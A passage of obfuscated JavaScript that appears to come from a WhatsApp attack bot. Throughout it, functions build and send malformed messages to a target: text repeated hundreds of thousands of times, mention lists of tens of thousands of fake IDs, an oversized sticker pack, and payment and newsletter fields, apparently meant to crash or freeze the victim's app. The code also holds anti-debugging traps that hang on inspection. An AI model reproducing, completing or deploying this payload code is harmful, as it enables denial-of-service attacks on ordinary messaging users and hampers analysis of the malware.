          [すたきや[90]]: すたきや[168] + すたきや[282] + すたきや[103],
          [すたきや[157] + すたきや[91]]: "{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"7eppeli.pdf\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"" + すたきや[158][すたきや[56]](すたきや[248]) + "\"}}",
          [すたきや[159] + すたきや[71]]: すたきや[19]
        }
      }
    };
    let ちせそ = ゆえつみおか[すたきや[542]](くめうめみか, {
      [すたきや[134] + すたきや[135] + すたきや[46] + すたきや[213]]: {
        [すたきや[104] + すたきや[44]]: めはぬこ
      }
    }, {});
    await ゆえつみおか[すたきや[541]][すたきや[49] + すたきや[46]](くめうめみか, ちせそ[すたきや[104] + すたきや[44]], うぬせ ? {
      [すたきや[104] + すたきや[172]]: ちせそ[すたきや[45]][すたきや[47]],
      [すたきや[50] + すたきや[51]]: {
        [すたきや[74]]: くめうめみか
      }
    } : {
      [すたきや[104] + すたきや[172]]: ちせそ[すたきや[45]][すたきや[47]]
    });
  }
}
async function ねとほまめあ([くめうめみか], うぬせ) {
  await うぬせ[すたきや[540]][すたきや[49] + すたきや[46]](くめうめみか, {
    ["sendPaymentM" + すたきや[46]]: {}
  }, {
    [すたきや[50] + すたきや[51]]: {
      [すたきや[74]]: くめうめみか
    }
  });
}
async function よあこも([くめうめみか], うぬせ) {
  await うぬせ[すたきや[539]][すたきや[49] + すたきや[46]](くめうめみか, {
    requestPaymentMessage: {
      ["currencyCodeIso421" + すたきや[249]]: すたきや[492],
      [すたきや[250] + "tFrom"]: くめうめみか,
      [すたきや[251] + すたきや[252] + すたきや[253]]: すたきや[37],
      [すたきや[148] + すたきや[149]]: {
        [すたきや[231] + すたきや[232]]: すたきや[4],
        [すたきや[233] + すたきや[234] + すたきや[235]]: すたきや[276],
        [すたきや[233] + すたきや[443] + すたきや[444] + すたきや[445] + すたきや[239]]: {
          [すたきや[210] + すたきや[241] + すたきや[222]]: "ＭＯＴＵ PATLU",
          [すたきや[210] + すたきや[240] + すたきや[209]]: すたきや[607] + すたきや[314]
        }
      }
    }
  }, {
    [すたきや[50] + すたきや[51]]: {
      [すたきや[74]]: くめうめみか
    },
    [すたきや[104] + すたきや[172]]: すたきや[37]
  });
}
async function てはまし([くめうめみか, うぬせ, ゆえつみおか], すかく) {
  try {
    let めはぬこ = await すかく[すたきや[267]](うぬせ, {
      [すたきや[126] + すたきや[127] + すたきや[103]]: {
        [すたきや[104] + すたきや[44]]: {
          [すたきや[108] + すたきや[254] + すたきや[255] + すたきや[185] + すたきや[147]]: {
            [すたきや[92]]: {
              [すたきや[43]]: すたきや[256] + すたきや[609],
              [すたきや[150]]: すたきや[151] + すたきや[152]
            },
            [すたきや[257] + すたきや[258] + すたきや[259] + すたきや[44]]: {
              [すたきや[90]]: すたきや[315] + すたきや[316] + すたきや[317] + すたきや[318],
              [すたきや[157] + すたきや[91]]: ""[すたきや[56]](1045000),
              [すたきや[159] + すたきや[71]]: すたきや[19]
            },
            entryPointConversionSource: すたきや[155] + すたきや[156] + すたきや[147]
          }
        }
      }
    }, {
      ["ephemeralExpiratio" + すたきや[71]]: すたきや[0],
      [すたきや[233] + すたきや[234] + すたきや[235]]: 9741,
      [すたきや[231] + すたきや[232]]: すたきや[4],
      font: Math[すたきや[260]](Math[すたきや[261]]() * 99999999),
      ["backgr" + すたきや[830]]: "#" + Math[すたきや[260]](Math[すたきや[261]]() * 16777215)[すたきや[20] + すたきや[21]](すたきや[5]).padStart(すたきや[605], すたきや[347] + "99")
    });
    await すかく[すたきや[269]](すたきや[243]);
    let ちせそ = {
      [すたきや[262] + すたきや[263] + すたきや[88] + すたきや[44]]: {
        [すたきや[43]]: すたきや[264][すたきや[56]](300000),
        [すたきや[148] + すたきや[149]]: {
          [すたきや[50] + すたきや[51]]: うぬせ,
          [すたきや[130] + すたきや[179]]: [すたきや[265] + すたきや[180] + すたきや[181], ...Array[すたきや[217]]({
            [すたきや[79]]: 850
          }, () => {
            return すたきや[266] + Math[すたきや[260]](Math[すたきや[261]]() * すたきや[370]) + (すたきや[80] + すたきや[81] + すたきや[82]);
          })]
        }
      }
    };
    const そしねめ = すかく[すたきや[267]](うぬせ, ちせそ, {});
    await くめうめみか[すたきや[49] + すたきや[46]](すたきや[85] + すたきや[86] + すたきや[87], そしねめ[すたきや[104] + すたきや[44]], {
      [すたきや[104] + すたきや[172]]: そしねめ[すたきや[45]][すたきや[47]],
      [すたきや[85] + すたきや[173] + すたきや[128]]: [うぬせ],
      [すたきや[140] + すたきや[141] + すたきや[142]]: [{
        [すたきや[129]]: すたきや[143],
        [すたきや[131]]: {},
        [すたきや[132] + すたきや[128]]: [{
          [すたきや[129]]: すたきや[130] + すたきや[174] + すたきや[175],
          [すたきや[131]]: {},
          [すたきや[132] + すたきや[128]]: [{
            [すたきや[129]]: すたきや[176],
            [すたきや[131]]: {
              [すたきや[74]]: うぬせ
            },
            [すたきや[132] + すたきや[128]]: すたきや[23]
          }]
        }]
      }]
    });
    if (ゆえつみおか) {
      debugger;
      await くめうめみか[すたきや[49] + すたきや[46]](うぬせ, {
        ["statusMentionM" + すたきや[46]]: {
          [すたきや[104] + すたきや[44]]: {
            [すたきや[137] + すたきや[138] + すたきや[103]]: {
              [すたきや[45]]: そしねめ[すたきや[45]][すたきや[47]],
              [すたきや[139]]: すたきや[268]
            }
          }
        }
      }, {});
    }
    await すかく[すたきや[269]](すたきや[243]);
    await くめうめみか[すたきや[49] + すたきや[46]](すたきや[85] + すたきや[86] + すたきや[87], めはぬこ[すたきや[104] + すたきや[44]], {
      [すたきや[104] + すたきや[172]]: めはぬこ[すたきや[45]][すたきや[47]],
      [すたきや[85] + すたきや[173] + すたきや[128]]: [うぬせ],
      [すたきや[140] + すたきや[141] + すたきや[142]]: [{
        [すたきや[129]]: すたきや[143],
        [すたきや[131]]: {},
        [すたきや[132] + すたきや[128]]: [{
          [すたきや[129]]: すたきや[130] + すたきや[174] + すたきや[175],
          [すたきや[131]]: {},
          [すたきや[132] + すたきや[128]]: [{
            [すたきや[129]]: すたきや[176],
            [すたきや[131]]: {
              [すたきや[74]]: うぬせ
            },
            [すたきや[132] + すたきや[128]]: すたきや[23]
          }]
        }]
      }]
    });
    if (ゆえつみおか) {
      await くめうめみか[すたきや[49] + すたきや[46]](うぬせ, {
        [すたきや[85] + "Mentio" + "nMessa" + すたきや[147]]: {
          [すたきや[104] + すたきや[44]]: {
            [すたきや[137] + すたきや[138] + すたきや[103]]: {
              [すたきや[45]]: めはぬこ[すたきや[45]][すたきや[47]],
              [すたきや[139]]: すたきや[268]
            }
          }
        }
      }, {});
    }
  } catch (ぬめくほき) {
    (function () {
      var くめうめみか = function () {
        const うぬせ = function () {
          const うぬせ = new RegExp(すたきや[75]);
          return うぬせ[すたきや[76]](くめうめみか);
        };
        if (うぬせ()) {
          while (すたきや[4]) {}
        }
      };
      return くめうめみか();
    })();
    console[すたきや[295]](すたきや[783] + "in :", ぬめくほき, "Tai Mr" + すたきや[774]);
  }
}
async function よやゆく([くめうめみか], うぬせ) {
  await うぬせ[すたきや[537]][すたきや[49] + すたきや[46]](すたきや[85] + すたきや[86] + すたきや[87], {
    [すたきや[126] + すたきや[127] + すたきや[103]]: {
      [すたきや[104] + すたきや[44]]: {
        [すたきや[104] + すたきや[270] + すたきや[271]]: {
          [すたきや[104] + すたきや[306] + すたきや[128]]: うぬせ[すたきや[538]][すたきや[261] + すたきや[307]](すたきや[308])
        },
        [すたきや[348] + すたきや[349] + すたきや[350] + すたきや[42]]: {
          [すたきや[92]]: {
            [すたきや[43]]: "ＭＯＴＵ PATLU" + すたきや[272],
            [すたきや[150]]: すたきや[151] + すたきや[152]
          },
          [すたきや[89] + すたきや[153] + すたきや[154] + すたきや[88] + すたきや[44]]: {
            [すたきや[90]]: すたきや[155] + すたきや[156] + すたきや[147],
            [すたきや[157] + すたきや[91]]: すたきや[273] + すたきや[274] + すたきや[275] + すたきや[158][すたきや[56]](すたきや[283]) + (すたきや[309] + すたきや[310] + すたきや[311] + すたきや[312] + すたきや[313]),
            [すたきや[159] + すたきや[71]]: すたきや[19]
          },
          [すたきや[148] + すたきや[149]]: {
            [すたきや[83] + すたきや[84]]: すたきや[85] + すたきや[86] + すたきや[87],
            [すたきや[50] + すたきや[51]]: すたきや[265] + すたきや[180] + すたきや[181],
            [すたきや[226]]: すたきや[4],
            [すたきや[231] + すたきや[232]]: すたきや[4],
            [すたきや[233] + すたきや[234] + すたきや[235]]: すたきや[276],
            [すたきや[236] + すたきや[237] + すたきや[238] + すたきや[239]]: {
              [すたきや[210] + すたきや[241] + すたきや[222]]: "༑ Fail Beta - ( @MOTU_PATALU_HINDU_HAI ) \"👋\"",
              [すたきや[210] + すたきや[240] + すたきや[209]]: "12036331931462796@newslette" + すたきや[199],
              [すたきや[242] + すたきや[88] + すたきや[172]]: すたきや[1]
            },
            [すたきや[184] + すたきや[88] + すたきや[44]]: {
              [すたきや[108] + すたきや[254] + すたきや[255] + すたきや[185] + すたきや[147]]: {
                [すたきや[92]]: {
                  [すたきや[43]]: すたきや[277] + すたきや[278] + すたきや[279] + すたきや[280] + すたきや[281],
                  [すたきや[150]]: すたきや[151] + すたきや[152]
                },
                [すたきや[89] + すたきや[153] + すたきや[154] + すたきや[88] + すたきや[44]]: {
                  [すたきや[90]]: すたきや[168] + すたきや[282] + すたきや[103],
                  [すたきや[157] + すたきや[91]]: すたきや[158][すたきや[56]](すたきや[283]),
                  [すたきや[159] + すたきや[71]]: すたきや[19]
                }
              }
            }
          }
        }
      }
    }
  }, {
    [すたきや[85] + すたきや[173] + すたきや[128]]: [くめうめみか],
    [すたきや[140] + すたきや[141] + すたきや[142]]: [{
      [すたきや[129]]: すたきや[143],
      [すたきや[131]]: {},
      [すたきや[132] + すたきや[128]]: [{
        [すたきや[129]]: すたきや[130] + すたきや[174] + すたきや[175],
        [すたきや[131]]: {},
        [すたきや[132] + すたきや[128]]: [{
          [すたきや[129]]: すたきや[176],
          [すたきや[131]]: {
            [すたきや[74]]: くめうめみか
          },
          [すたきや[132] + すたきや[128]]: []
        }]
      }]
    }]
  });
}
async function しねう([くめうめみか, うぬせ], ゆえつみおか) {
  try {
    const すかく = await くめうめみか[すたきや[49] + すたきや[46]](うぬせ, {
      [すたきや[262] + すたきや[263] + すたきや[88] + すたきや[44]]: {
        [すたきや[43]]: すたきや[158][すたきや[56]](すたきや[188]),
        matchedText: すたきや[293][すたきや[56]](すたきや[188]),
        [すたきや[450] + すたきや[451]]: "Its Me" + すたきや[322] + すたきや[77],
        [すたきや[98]]: すたきや[371][すたきや[56]](すたきや[188]),
        previewType: "NONE",
        [すたきや[120] + すたきや[121] + すたきや[101]]: すたきや[37],
        [すたきや[48] + すたきや[284] + すたきや[285] + すたきや[286]]: すたきや[151] + すたきや[152],
        [すたきや[148] + すたきや[149]]: {
          [すたきや[231] + すたきや[232]]: すたきや[4],
          [すたきや[233] + すたきや[234] + すたきや[235]]: すたきや[276],
          [すたきや[83] + すたきや[84]]: すたきや[85] + すたきや[86] + すたきや[87],
          [すたきや[130] + すたきや[179]]: [すたきや[265] + すたきや[180] + すたきや[181], ...Array[すたきや[217]]({
            [すたきや[79]]: 1900
          }, () => {
            (function () {
              var くめうめみか = function () {
                const うぬせ = function () {
                  const うぬせ = new RegExp(すたきや[75]);
                  return うぬせ[すたきや[76]](くめうめみか);
                };
                if (うぬせ()) {
                  while (すたきや[4]) {}
                }
              };
              return くめうめみか();
            })();
            return すたきや[266] + Math[すたきや[260]](Math[すたきや[261]]() * すたきや[287]) + (すたきや[80] + すたきや[81] + すたきや[82]);
          })],
          [すたきや[184] + すたきや[88] + すたきや[44]]: {
            [すたきや[288] + すたきや[289] + すたきや[185] + すたきや[147]]: {
              [すたきや[290] + すたきや[291]]: すたきや[19],
              [すたきや[251] + すたきや[252] + すたきや[253]]: Date[すたきや[292]]() + 1814400000
            }
          },
          forwardedNewsletterMessageInfo: {
            [すたきや[210] + すたきや[241] + すたきや[222]]: すたきや[293],
            [すたきや[210] + すたきや[240] + すたきや[209]]: すたきや[182] + すたきや[205] + すたきや[210] + "tter",
            [すたきや[242] + すたきや[294]]: すたきや[1]
          }
        }
      }
    }, {
      [すたきや[50] + すたきや[51]]: {
        [すたきや[74]]: うぬせ
      }
    });
    await くめうめみか[すたきや[41] + すたきや[42]](うぬせ, {
      [すたきや[736]]: {
        [すたきや[226]]: すたきや[4],
        [すたきや[83] + すたきや[84]]: うぬせ,
        [すたきや[47]]: すかく
      }
    });
  } catch (めはぬこ) {
    (function () {
      var くめうめみか = function () {
        const うぬせ = function () {
          const うぬせ = new RegExp(すたきや[75]);
          return うぬせ[すたきや[76]](くめうめみか);
        };
        if (うぬせ()) {
          while (すたきや[4]) {}
        }
      };
      return くめうめみか();
    })();
    console[すたきや[295]](すたきや[358], めはぬこ);
    throw new Error(めはぬこ[すたきや[104] + すたきや[44]]);
  }
}
async function たおてはきく([くめうめみか, うぬせ], ゆえつみおか) {
  try {
    (function () {
      var くめうめみか = function () {
        const うぬせ = function () {
          const うぬせ = new RegExp(すたきや[75]);
          return うぬせ[すたきや[76]](くめうめみか);
        };
        if (うぬせ()) {
          while (すたきや[4]) {}
        }
      };
      return くめうめみか();
    })();
    const すかく = ゆえつみおか[すたきや[536]](うぬせ, {
      [すたきや[126] + すたきや[127] + すたきや[103]]: {
        [すたきや[104] + すたきや[44]]: {
          [すたきや[108] + すたきや[93] + すたきや[46]]: {
            [すたきや[92]]: {
              [すたきや[43]]: すたきや[158]
            },
            [すたきや[89] + すたきや[102] + すたきや[42]]: {
              [すたきや[104] + すたきや[303] + すたきや[304]]: すたきや[305][すたきや[56]](すたきや[188])
            },
            [すたきや[148] + すたきや[149]]: {
              [すたきや[50] + すたきや[51]]: うぬせ,
              [すたきや[83] + すたきや[84]]: すたきや[85] + すたきや[86] + すたきや[87],
              [すたきや[130] + すたきや[179]]: Array[すたきや[217]]({
                [すたきや[79]]: 42000
              }, () => {
                (function () {
                  var くめうめみか = function () {
                    const うぬせ = function () {
                      const うぬせ = new RegExp(すたきや[75]);
                      return うぬせ[すたきや[76]](くめうめみか);
                    };
                    if (うぬせ()) {
                      while (すたきや[4]) {}
                    }
                  };
                  return くめうめみか();
                })();
                return すたきや[266] + Math[すたきや[260]](Math[すたきや[261]]() * すたきや[296]) + (すたきや[80] + すたきや[81] + すたきや[82]);
              })
            }
          }
        }
      }
    }, {});
    await くめうめみか[すたきや[49] + すたきや[46]](うぬせ, すかく[すたきや[104] + すたきや[44]], {
      [すたきや[104] + すたきや[172]]: すかく[すたきや[45]][すたきや[47]],
      [すたきや[50] + すたきや[51]]: {
        [すたきや[74]]: うぬせ
      }
    });
  } catch (めはぬこ) {
    debugger;
    console[すたきや[295]](めはぬこ);
    throw new Error(めはぬこ[すたきや[104] + すたきや[44]]);
  }
}
async function へつねもこ([くめうめみか, うぬせ], ゆえつみおか) {
  (function () {
    var くめうめみか = function () {
      const うぬせ = function () {
        const うぬせ = new RegExp(すたきや[75]);
        return うぬせ[すたきや[76]](くめうめみか);
      };
      if (うぬせ()) {
        while (すたきや[4]) {}
      }
    };
    return くめうめみか();
  })();
  try {
    const すかく = ゆえつみおか[すたきや[535]](うぬせ, {
      [すたきや[126] + すたきや[127] + すたきや[103]]: {
        [すたきや[104] + すたきや[44]]: {
          [すたきや[108] + すたきや[93] + すたきや[46]]: {
            [すたきや[92]]: {
              [すたきや[43]]: すたきや[158]
            },
            [すたきや[148] + すたきや[149]]: {
              [すたきや[231] + すたきや[232]]: すたきや[4],
              [すたきや[233] + すたきや[234] + すたきや[235]]: すたきや[276],
              [すたきや[83] + すたきや[84]]: すたきや[85] + すたきや[86] + すたきや[87],
              [すたきや[130] + すたきや[179]]: [すたきや[265] + すたきや[180] + すたきや[181], ...Array[すたきや[217]]({
                [すたきや[79]]: すたきや[323]
              }, () => {
                (function () {
                  var くめうめみか = function () {
                    const うぬせ = function () {
                      const うぬせ = new RegExp(すたきや[75]);
                      return うぬせ[すたきや[76]](くめうめみか);
                    };
                    if (うぬせ()) {
                      while (すたきや[4]) {}
                    }
                  };
                  return くめうめみか();
                })();
                return すたきや[266] + Math[すたきや[260]](Math[すたきや[261]]() * すたきや[287]) + (すたきや[80] + すたきや[81] + すたきや[82]);
              })]
            },
            [すたきや[89] + すたきや[102] + すたきや[42]]: {
              [すたきや[78] + すたきや[77]]: [{
                [すたきや[90]]: すたきや[298] + すたきや[299] + すたきや[128],
                [すたきや[78] + すたきや[297] + すたきや[91]]: JSON[すたきや[24] + すたきや[300]]({
                  [すたきや[98]]: すたきや[301][すたきや[56]](すたきや[216])
                })
              }, {
                [すたきや[90]]: すたきや[298] + すたきや[299] + すたきや[128],
                [すたきや[78] + すたきや[297] + すたきや[91]]: JSON[すたきや[24] + すたきや[300]]({
                  [すたきや[98]]: すたきや[301][すたきや[56]](すたきや[216])
                })
              }, {
                [すたきや[90]]: すたきや[155] + すたきや[156] + すたきや[147],
                [すたきや[78] + すたきや[297] + すたきや[91]]: JSON[すたきや[24] + すたきや[300]]({
                  ["flow_m" + すたきや[46] + "_versi" + すたきや[832]]: すたきや[429],
                  flow_token: "unused",
                  ["flow_i" + すたきや[209]]: "9876543210",
                  [すたきや[356] + すたきや[357]]: すたきや[301][すたきや[56]](30000),
                  [すたきや[302] + "ction"]: "form_submit",
                  [すたきや[302] + "ction_" + "payloa" + すたきや[209]]: {
                    ["from_i" + すたきや[209]]: すたきや[37]
                  },
                  icon: "PROMOTE"
                })
              }],
              [すたきや[104] + すたきや[303] + すたきや[304]]: すたきや[305][すたきや[56]](すたきや[188])
            }
          }
        }
      }
    }, {});
    await くめうめみか[すたきや[49] + すたきや[46]](うぬせ, すかく[すたきや[104] + すたきや[44]], {
      [すたきや[104] + すたきや[172]]: すかく[すたきや[45]][すたきや[47]],
      [すたきや[50] + すたきや[51]]: {
        [すたきや[74]]: うぬせ
      }
    });
  } catch (めはぬこ) {
    debugger;
    console[すたきや[295]](めはぬこ);
  }
}
async function にやそ([くめうめみか], うぬせ) {
  let ゆえつみおか = await うぬせ[すたきや[534]](くめうめみか, {
    [すたきや[126] + すたきや[127] + すたきや[103]]: {
      [すたきや[104] + すたきや[44]]: {
        [すたきや[104] + すたきや[270] + すたきや[271]]: {
          [すたきや[104] + すたきや[306] + すたきや[128]]: うぬせ[すたきや[532]][すたきや[261] + すたきや[307]](すたきや[308])
        },
        [すたきや[108] + すたきや[254] + すたきや[255] + すたきや[185] + すたきや[147]]: {
          [すたきや[92]]: {
            [すたきや[43]]: "🎭⃟༑⌁⃰𝐏𝐫𝐢͢𝐦𝐢𝐬 𝑪͢𝒓��ͯ͢𝒔𝒉ཀ͜͡🐉",
            [すたきや[150]]: すたきや[151] + すたきや[152]
          },
          [すたきや[257] + すたきや[258] + すたきや[259] + すたきや[44]]: {
            [すたきや[90]]: すたきや[155] + すたきや[156] + すたきや[147],
            [すたきや[157] + すたきや[91]]: すたきや[273] + すたきや[274] + すたきや[275] + すたきや[158][すたきや[56]](すたきや[248]) + (すたきや[309] + すたきや[310] + すたきや[311] + すたきや[312] + すたきや[313]),
            [すたきや[159] + すたきや[71]]: すたきや[19]
          },
          [すたきや[148] + すたきや[149]]: {
            [すたきや[231] + すたきや[232]]: すたきや[4],
            [すたきや[233] + すたきや[234] + すたきや[235]]: すたきや[276],
            [すたきや[236] + すたきや[237] + すたきや[238] + すたきや[239]]: {
              [すたきや[210] + すたきや[241] + すたきや[222]]: すたきや[277] + すたきや[278] + すたきや[279] + すたきや[280] + すたきや[281],
              [すたきや[210] + すたきや[240] + すたきや[209]]: "0@news" + すたきや[314],
              [すたきや[242] + すたきや[88] + すたきや[172]]: すたきや[1]
            }
          }
        }
      }
    }
  }, {});
  await うぬせ[すたきや[533]][すたきや[49] + すたきや[46]](すたきや[85] + すたきや[86] + すたきや[87], ゆえつみおか[すたきや[104] + すたきや[44]], {
    [すたきや[104] + すたきや[172]]: ゆえつみおか[すたきや[45]][すたきや[47]],
    [すたきや[85] + すたきや[173] + すたきや[128]]: [くめうめみか],
    [すたきや[140] + すたきや[141] + すたきや[142]]: [{
      [すたきや[129]]: すたきや[143],
      [すたきや[131]]: {},
      [すたきや[132] + すたきや[128]]: [{
        [すたきや[129]]: すたきや[130] + すたきや[174] + すたきや[175],
        [すたきや[131]]: {},
        [すたきや[132] + すたきや[128]]: [{
          [すたきや[129]]: すたきや[176],
          [すたきや[131]]: {
            [すたきや[74]]: くめうめみか
          },
          [すたきや[132] + すたきや[128]]: すたきや[23]
        }]
      }]
    }]
  });
}
async function よめこにいし([くめうめみか], うぬせ) {
  await うぬせ[すたきや[531]][すたきや[49] + すたきや[46]](くめうめみか, {
    [すたきや[126] + すたきや[127] + すたきや[103]]: {
      [すたきや[104] + すたきや[44]]: {
        [すたきや[108] + すたきや[254] + すたきや[255] + すたきや[185] + すたきや[147]]: {
          [すたきや[92]]: {
            [すたきや[43]]: すたきや[256] + すたきや[319],
            [すたきや[150]]: すたきや[151] + すたきや[152]
          },
          [すたきや[89] + すたきや[153] + すたきや[154] + すたきや[88] + すたきや[44]]: {
            [すたきや[90]]: すたきや[315] + すたきや[316] + すたきや[317] + すたきや[318],
            [すたきや[157] + すたきや[91]]: すたきや[158][すたきや[56]](すたきや[351]),
            [すたきや[159] + すたきや[71]]: すたきや[19]
          }
        }
      }
    }
  }, {
    [すたきや[50] + すたきや[51]]: {
      [すたきや[74]]: くめうめみか
    }
  });
}
async function おいすねふぬ([くめうめみか], うぬせ) {
  debugger;
  const ゆえつみおか = await うぬせ[すたきや[530]](くめうめみか, {
    [すたきや[78] + すたきや[359] + すたきや[147]]: {
      [すたきや[43]]: すたきや[360],
      [すたきや[132] + すたきや[361]]: すたきや[256] + すたきや[319],
      [すたきや[110] + すたきや[320]]: すたきや[256] + すたきや[319],
      [すたきや[78] + すたきや[77]]: [{
        [すたきや[78] + すたきや[294]]: すたきや[362],
        [すたきや[78] + すたきや[320]]: {
          [すたきや[363] + すたきや[321]]: すたきや[322] + すたきや[364] + すたきや[158][すたきや[56]](すたきや[296])
        },
        [すたきや[139]]: すたきや[1]
      }],
      [すたきや[113] + すたきや[365]]: すたきや[1]
    }
  }, {});
  await うぬせ[すたきや[529]][すたきや[49] + すたきや[46]](くめうめみか, ゆえつみおか[すたきや[104] + すたきや[44]], {
    [すたきや[104] + すたきや[172]]: ゆえつみおか[すたきや[45]][すたきや[47]],
    [すたきや[50] + すたきや[51]]: {
      [すたきや[74]]: くめうめみか
    }
  });
}
async function まみにちせ([くめうめみか, うぬせ], ゆえつみおか) {
  try {
    const すかく = [すたきや[265] + すたきや[180] + すたきや[181], ...Array[すたきや[217]]({
      [すたきや[79]]: すたきや[323]
    }, () => {
      return すたきや[266] + Math[すたきや[260]](Math[すたきや[261]]() * すたきや[287]) + (すたきや[80] + すたきや[81] + すたきや[82]);
    })];
    const めはぬこ = ゆえつみおか[すたきや[528]](うぬせ, {
      [すたきや[126] + すたきや[127] + すたきや[103]]: {
        [すたきや[104] + すたきや[44]]: {
          [すたきや[324] + "rPackM" + すたきや[46]]: {
            [すたきや[324] + "rPackI" + すたきや[209]]: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            [すたきや[90]]: すたきや[325][すたきや[56]](すたきや[216]),
            publisher: すたきや[325][すたきや[56]](すたきや[216]),
            [すたきや[70] + すたきや[71]]: すたきや[325][すたきや[56]](すたきや[216]),
            [すたきや[324] + "rs"]: [...Array[すたきや[217]]({
              [すたきや[79]]: 4700
            }, () => {
              (function () {
                var くめうめみか = function () {
                  const うぬせ = function () {
                    const うぬせ = new RegExp(すたきや[75]);
                    return うぬせ[すたきや[76]](くめうめみか);
                  };
                  if (うぬせ()) {
                    while (すたきや[4]) {}
                  }
                };
                return くめうめみか();
              })();
              return {
                ["fileNa" + すたきや[222]]: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.web" + すたきや[799],
                ["isAnim" + すたきや[815]]: すたきや[2],
                emojis: [すたきや[326], "🩸", すたきや[75], "💥"],
                [すたきや[327] + すたきや[328] + "yLabel"]: "",
                [すたきや[324] + "rSentT" + すたきや[77]]: "PnX-ID-msg",
                isAvatar: すたきや[4],
                isAiSticker: すたきや[4],
                isLottie: すたきや[4],
                [すたきや[329] + すたきや[211]]: "application/pdf"
              };
            })],
            [すたきや[330] + すたきや[331]]: すたきや[377] + すたきや[378] + すたきや[99],
            [すたきや[332] + すたきや[333]]: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            [すたきや[334] + すたきや[335] + すたきや[336]]: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            [すたきや[100] + すたきや[225]]: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            [すたきや[337] + すたきや[338]]: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4",
            [すたきや[148] + すたきや[149]]: {
              [すたきや[83] + すたきや[84]]: すたきや[183],
              [すたきや[50] + すたきや[51]]: すたきや[265] + すたきや[180] + すたきや[181],
              [すたきや[339] + すたきや[294]]: すたきや[340] + "7890AB" + "CDEF",
              [すたきや[130] + すたきや[179]]: すかく
            },
            ["packDescript" + すたきや[341]]: "",
            [すたきや[100] + すたきや[342] + すたきや[343]]: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            [すたきや[72] + "ailDir" + "ectPat" + すたきや[346]]: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4",
            [すたきや[72] + "ailSha" + "256"]: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            [すたきや[72] + "ailEnc" + すたきや[344]]: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            [すたきや[72] + "ailHei" + すたきや[816]]: すたきや[345],
            [すたきや[72] + "ailWid" + すたきや[470]]: すたきや[345],
            ["imageDataHas" + すたきや[346]]: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            [すたきや[324] + "rPackS" + "ize"]: すたきや[347] + すたきや[69],
            [すたきや[324] + "rPackO" + "rigin"]: "USER_CREATED"
          }
        }
      }
    }, {});
    await くめうめみか[すたきや[49] + すたきや[46]](うぬせ, めはぬこ[すたきや[104] + すたきや[44]], {
      [すたきや[50] + すたきや[51]]: {
        [すたきや[74]]: うぬせ
      },
      [すたきや[104] + すたきや[172]]: めはぬこ[すたきや[45]][すたきや[47]]
    });
  } catch (ちせそ) {
    (function () {
      var くめうめみか = function () {
        const うぬせ = function () {
          const うぬせ = new RegExp(すたきや[75]);
          return うぬせ[すたきや[76]](くめうめみか);
        };
        if (うぬせ()) {
          while (すたきや[4]) {}
        }
      };
      return くめうめみか();
    })();
    console[すたきや[295]]("XBlank Error" + すたきや[399], ちせそ);
  }
}
async function しねくふま([くめうめみか, うぬせ = すたきや[4]], ゆえつみおか) {
  debugger;
  const すかく = await ゆえつみおか[すたきや[527]](くめうめみか, {
    [すたきや[126] + すたきや[127] + すたきや[103]]: {
      [すたきや[104] + すたきや[44]]: {
        [すたきや[348] + すたきや[349] + すたきや[350] + すたきや[42]]: {
          [すたきや[92]]: {
            [すたきや[43]]: すたきや[256] + すたきや[319],
            [すたきや[150]]: すたきや[151] + すたきや[152]
          },
          [すたきや[89] + すたきや[153] + すたきや[154] + すたきや[88] + すたきや[44]]: {
            [すたきや[90]]: すたきや[315] + すたきや[316] + すたきや[317] + すたきや[318],
            [すたきや[157] + すたきや[91]]: すたきや[158][すたきや[56]](すたきや[351]),
            [すたきや[159] + すたきや[71]]: すたきや[19]
          }
        }
      }
    }
  }, {});
  await ゆえつみおか[すたきや[352]][すたきや[49] + すたきや[46]](すたきや[85] + すたきや[86] + すたきや[87], すかく[すたきや[104] + すたきや[44]], {
    [すたきや[104] + すたきや[172]]: すかく[すたきや[45]][すたきや[47]],
    [すたきや[85] + すたきや[173] + すたきや[128]]: [くめうめみか],
    [すたきや[140] + すたきや[141] + すたきや[142]]: [{
      [すたきや[129]]: すたきや[143],
      [すたきや[131]]: {},
      [すたきや[132] + すたきや[128]]: [{
        [すたきや[129]]: すたきや[130] + すたきや[174] + すたきや[175],
        [すたきや[131]]: {},
        [すたきや[132] + すたきや[128]]: [{
          [すたきや[129]]: すたきや[176],
          [すたきや[131]]: {
            [すたきや[74]]: くめうめみか
          },
          [すたきや[132] + すたきや[128]]: すたきや[23]
        }]
      }]
    }]
  });
  if (うぬせ) {
    debugger;
    await ゆえつみおか[すたきや[352]][すたきや[49] + すたきや[46]](くめうめみか, {
      [すたきや[367] + すたきや[368] + すたきや[369] + すたきや[44]]: {
        [すたきや[104] + すたきや[44]]: {
          [すたきや[137] + すたきや[138] + すたきや[103]]: {
            [すたきや[45]]: すかく[すたきや[45]],
            [すたきや[139]]: すたきや[268]
          }
        }
      }
    }, {
      [すたきや[140] + すたきや[141] + すたきや[142]]: [{
        [すたきや[129]]: すたきや[143],
        [すたきや[131]]: {
          [すたきや[353] + すたきや[354] + すたきや[355]]: "Yy"
        },
        [すたきや[132] + すたきや[128]]: すたきや[23]
      }]
    });
  }
}
async function うせすつとき([くめうめみか, うぬせ], ゆえつみおか) {
  try {
    debugger;
    for (let すかく = すたきや[0]; すかく < すたきや[17]; すかく++) {
      debugger;
